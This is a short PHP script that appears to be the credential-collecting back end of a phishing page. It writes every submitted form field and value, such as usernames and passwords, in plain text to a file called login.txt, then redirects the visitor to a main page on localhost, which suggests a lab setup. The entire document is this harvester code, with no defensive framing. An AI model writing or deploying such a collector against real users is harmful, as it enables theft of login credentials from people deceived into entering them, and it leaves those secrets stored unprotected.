<?php 
// Log the POST data to a file
$file = fopen("login.txt", "a");

foreach($_POST as $variable => $value) { 
	fwrite($file, $variable); 
	fwrite($file, "= "); 
	fwrite($file, $value); 
	fwrite($file, "\r\n"); 
} 

fwrite($file, "\r\n"); 
fclose($file); 

// Redirect to the main page
header('Location: http://localhost/'); 
exit; 
?>
